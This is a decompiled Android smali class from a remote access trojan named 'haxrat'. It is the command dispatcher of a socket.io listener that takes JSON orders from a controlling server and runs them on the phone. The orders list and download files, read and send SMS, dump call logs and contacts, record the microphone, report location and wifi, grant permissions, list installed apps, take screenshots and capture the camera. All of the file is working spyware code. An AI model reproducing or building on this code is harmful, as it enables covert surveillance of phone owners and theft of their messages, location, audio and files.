.class Lcom/hax4us/haxrat/ConnectionManager$100000001;
.super Ljava/lang/Object;
.source "ConnectionManager.java"

# interfaces
.implements Lio/socket/emitter/Emitter$Listener;


# annotations
.annotation system Ldalvik/annotation/EnclosingClass;
    value = Lcom/hax4us/haxrat/ConnectionManager;
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x20
    name = "100000001"
.end annotation


# direct methods
.method constructor <init>()V
    .locals 3

    move-object v0, p0

    move-object v2, v0

    invoke-direct {v2}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public varargs call([Ljava/lang/Object;)V
    .locals 11
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "([",
            "Ljava/lang/Object;",
            ")V"
        }
    .end annotation

    .annotation runtime Ljava/lang/Override;
    .end annotation

    .prologue
    .line 53
    move-object v0, p0

    move-object v1, p1

    move-object v7, v1

    const/4 v8, 0x0

    :try_start_0
    aget-object v7, v7, v8

    check-cast v7, Lorg/json/JSONObject;

    move-object v3, v7

    .line 54
    move-object v7, v3

    const-string v8, "type"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    move-object v4, v7

    .line 57
    move-object v7, v4

    move-object v5, v7

    move-object v7, v5

    const-string v8, "0xFI"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_2

    .line 65
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "ls"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_1

    .line 66
    const/4 v7, 0x0

    move-object v8, v3

    const-string v9, "path"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->FI(ILjava/lang/String;)V

    .line 120
    :cond_0
    :goto_0
    return-void

    .line 67
    :cond_1
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "dl"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_0

    .line 68
    const/4 v7, 0x1

    move-object v8, v3

    const-string v9, "path"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->FI(ILjava/lang/String;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    .line 117
    :catch_0
    move-exception v7

    move-object v3, v7

    .line 120
    move-object v7, v3

    invoke-virtual {v7}, Ljava/lang/Exception;->printStackTrace()V

    goto :goto_0

    .line 69
    :cond_2
    move-object v7, v5

    :try_start_1
    const-string v8, "0xSM"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_5

    .line 71
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "ls"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_4

    .line 72
    const/4 v7, 0x0

    const/4 v8, 0x0

    check-cast v8, Ljava/lang/String;

    const/4 v9, 0x0

    check-cast v9, Ljava/lang/String;

    invoke-static {v7, v8, v9}, Lcom/hax4us/haxrat/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    .line 75
    :cond_3
    :goto_1
    goto :goto_0

    .line 73
    :cond_4
    move-object v7, v3

    const-string v8, "action"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v8, "sendSMS"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_3

    .line 74
    const/4 v7, 0x1

    move-object v8, v3

    const-string v9, "to"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v8

    move-object v9, v3

    const-string v10, "sms"

    invoke-virtual {v9, v10}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v9

    invoke-static {v7, v8, v9}, Lcom/hax4us/haxrat/ConnectionManager;->SM(ILjava/lang/String;Ljava/lang/String;)V

    goto :goto_1

    .line 75
    :cond_5
    move-object v7, v5

    const-string v8, "0xCL"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_6

    .line 77
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->CL()V

    .line 78
    goto :goto_0

    :cond_6
    move-object v7, v5

    const-string v8, "0xCO"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_7

    .line 80
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->CO()V

    .line 81
    goto/16 :goto_0

    :cond_7
    move-object v7, v5

    const-string v8, "0xMI"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_8

    .line 83
    move-object v7, v3

    const-string v8, "sec"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v7

    invoke-static {v7}, Lcom/hax4us/haxrat/ConnectionManager;->MI(I)V

    .line 84
    goto/16 :goto_0

    :cond_8
    move-object v7, v5

    const-string v8, "0xLO"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_9

    .line 86
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->LO()V

    .line 87
    goto/16 :goto_0

    :cond_9
    move-object v7, v5

    const-string v8, "0xWI"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_a

    .line 89
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->WI()V

    .line 90
    goto/16 :goto_0

    :cond_a
    move-object v7, v5

    const-string v8, "0xPM"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_b

    .line 92
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->PM()V

    .line 93
    goto/16 :goto_0

    :cond_b
    move-object v7, v5

    const-string v8, "0xIN"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_c

    .line 95
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->IN()V

    .line 96
    goto/16 :goto_0

    :cond_c
    move-object v7, v5

    const-string v8, "0xGP"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_d

    .line 98
    move-object v7, v3

    const-string v8, "permission"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getString(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    invoke-static {v7}, Lcom/hax4us/haxrat/ConnectionManager;->GP(Ljava/lang/String;)V

    .line 99
    goto/16 :goto_0

    :cond_d
    move-object v7, v5

    const-string v8, "0xLD"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_e

    .line 101
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->LD()V

    .line 102
    goto/16 :goto_0

    :cond_e
    move-object v7, v5

    const-string v8, "0xUD"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_f

    .line 104
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->UD()V

    .line 105
    goto/16 :goto_0

    :cond_f
    move-object v7, v5

    const-string v8, "0xSS"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_10

    .line 107
    invoke-static {}, Lcom/hax4us/haxrat/ConnectionManager;->SS()V

    .line 108
    goto/16 :goto_0

    :cond_10
    move-object v7, v5

    const-string v8, "0xSR"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_11

    .line 110
    move-object v7, v3

    const-string v8, "sec"

    invoke-virtual {v7, v8}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v7

    invoke-static {v7}, Lcom/hax4us/haxrat/ConnectionManager;->SR(I)V

    .line 111
    goto/16 :goto_0

    :cond_11
    move-object v7, v5

    const-string v8, "0xRC"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_12

    .line 113
    const/4 v7, 0x1

    move-object v8, v3

    const-string v9, "sec"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v8

    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->RC(II)V

    .line 114
    goto/16 :goto_0

    :cond_12
    move-object v7, v5

    const-string v8, "0xFC"

    invoke-virtual {v7, v8}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    const/4 v8, 0x1

    if-ne v7, v8, :cond_0

    .line 116
    const/4 v7, 0x2

    move-object v8, v3

    const-string v9, "sec"

    invoke-virtual {v8, v9}, Lorg/json/JSONObject;->getInt(Ljava/lang/String;)I

    move-result v8

    invoke-static {v7, v8}, Lcom/hax4us/haxrat/ConnectionManager;->FC(II)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 117
    goto/16 :goto_0
.end method
